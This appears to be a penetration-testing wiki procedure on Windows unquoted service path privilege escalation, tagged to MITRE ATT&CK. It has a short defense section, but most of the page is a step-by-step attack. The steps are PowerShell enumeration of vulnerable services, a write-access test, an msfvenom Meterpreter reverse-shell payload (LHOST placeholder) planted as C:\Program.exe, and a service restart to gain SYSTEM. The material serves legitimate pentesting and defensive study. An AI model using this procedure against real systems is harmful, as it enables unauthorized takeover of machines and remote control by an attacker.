---
id: e2e1e2ec-f83f-45c8-b80c-457da64c951c
name: Windows-Unquoted-Service-Path-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.715839+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Create-or-Modify-System-Process|T1543 - Create or Modify System
    Process]]
  - >-
    [[techniques/Services-File-Permissions|T1543.003 - Services File
    Permissions]]
sub_techniques: []
tags:
  - '[[tags/EoP-Unquoted-Service-Paths]]'
  - '[[tags/Windows-Privilege-Escalation]]'
commands:
  - '[[commands/powershell-enumerate-unquoted-service-paths]]'
  - '[[commands/cmd-test-write-access-to-directory]]'
  - '[[commands/cmd-restart-windows-service]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-Unquoted-Service-Path-Privilege-Escalation

## Summary

This procedure exploits misconfigured Windows services with unquoted binary paths containing spaces, enabling privilege escalation by intercepting the service execution path and running a malicious executable with SYSTEM privileges. It is a common local privilege escalation technique on Windows systems where service paths are not properly quoted in the registry.

## Description

Windows services store their executable paths in the registry under HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath. If the path contains spaces (e.g., 'C:\Program Files\Vulnerable Service\svchost.exe') and is not enclosed in quotes, the Windows service control manager interprets it as a sequence of potential executables, starting from the first segment. An attacker with write access to an earlier directory in the path (e.g., C:\) can place a malicious executable named after the first segment (e.g., 'Program.exe'), causing the service to execute the attacker's binary instead of the legitimate one when started. This grants elevated privileges, often SYSTEM level, allowing further persistence or lateral movement. The technique requires local access and is effective against outdated or poorly configured services.

## Requirements

1. Local low-privilege user access to the target Windows system (e.g., standard user account).
2. Write permissions to a directory in the unquoted service path (e.g., C:\ or a parent folder like C:\Program Files\).
3. Ability to create or upload a malicious executable (e.g., a reverse shell payload compiled as .exe).
4. The target service must be running or restartable by the current user.

## Defense

- Ensure all service ImagePath registry values are enclosed in double quotes, especially those with spaces.
- Restrict write permissions on system directories (e.g., C:\, C:\Program Files) to administrators only using NTFS permissions.
- Regularly audit service configurations with tools like PowerShell scripts or Group Policy to enforce quoted paths.
- Monitor for unexpected process executions from service directories, file creations in system paths, and service restarts via Windows Event Logs (Event ID 7045 for service installs, 7036 for starts/stops).
- Use application whitelisting (e.g., AppLocker or WDAC) to prevent unsigned executables from running in sensitive paths.

## Objectives

1. Identify vulnerable services with unquoted paths containing spaces.
2. Place a malicious executable to intercept service execution.
3. Achieve privilege escalation to SYSTEM level via service trigger.
4. Maintain access or pivot to higher-privilege actions post-escalation.

## Instructions

### Step 1: Enumerate Vulnerable Services

**Context**: Query all services to identify those with unquoted ImagePath values containing spaces, which are exploitable if write access exists to intermediate directories. This step filters for potential targets without alerting defenses.

**Command** ([[commands/powershell-enumerate-unquoted-service-paths]]):
```powershell
Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object { $_.PathName -notlike '*"*"*' -and $_.PathName -match '\s' } | Format-Table -AutoSize
```

> This PowerShell command uses WMI to retrieve service names and paths, filtering for unquoted paths with spaces. Run it from an elevated or standard prompt. If no results, no immediate vulnerabilities; otherwise, note services like 'VulnerableService' with paths like 'C:\Program Files\App\service.exe'.

**Expected Output**: A table listing service names and paths, e.g.:

Name                PathName
----                -------
VulnerableService   C:\Program Files\App\service.exe

### Step 2: Verify Write Access to Intercept Directory

**Context**: Test write permissions in the directory that would intercept the path (e.g., root of the first path segment). This confirms exploitability without triggering the service yet. If access is denied, seek alternative paths or escalate differently.

**Command** ([[commands/cmd-test-write-access-to-directory]]):
```cmd
echo test > C:\Program.txt && del C:\Program.txt
```

> Replace 'C:\Program.txt' with the target intercept path (e.g., 'C:\Program.exe' filename simulation). This attempts to create and delete a test file. Success indicates write access; failure requires privilege adjustment or path selection.

**Expected Output**: No error on echo and del; command prompt returns without 'Access denied'.

**Success Indicators**:
- File creation succeeds and is deletable.
- No UAC or permission prompts interrupt.

### Step 3: Place Malicious Executable

**Context**: Create or transfer a payload executable (e.g., a Meterpreter reverse shell or simple cmd spawner) and rename/place it to match the path interception. This step prepares the exploit but does not execute until the service runs. Use certutil or PowerShell for transfer if needed.

**Instructions**: Compile a basic payload (e.g., using msfvenom: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o malicious.exe). Then copy it to the intercept location, e.g., copy malicious.exe C:\Program.exe. Ensure the filename matches the first unquoted segment exactly (case-sensitive).

**Expected Output**: File placed successfully; verify with dir C:\Program.exe showing the file exists.

**Success Indicators**:
- Payload file appears in the target directory.
- File size and hash match the uploaded payload.

### Step 4: Trigger Service Execution

**Context**: Restart the vulnerable service to force execution of the intercepted malicious binary with elevated privileges. Monitor for shell callback or new processes. If the service is critical, this may cause downtime; test in labs first.

**Command** ([[commands/cmd-restart-windows-service]]):
```cmd
sc stop VulnerableService && sc start VulnerableService
```

> Replace 'VulnerableService' with the target service name from Step 1. The stop command halts the service; start triggers the path resolution and execution of your payload.

**Expected Output**: Service status changes to STOPPED then STARTED; no errors like 'Access denied'. Incoming connection on your listener if using a reverse shell.

**Success Indicators**:
- Service restarts without errors.
- Elevated shell or process spawns (check with tasklist or your C2 framework).
- Whoami shows nt authority\system.
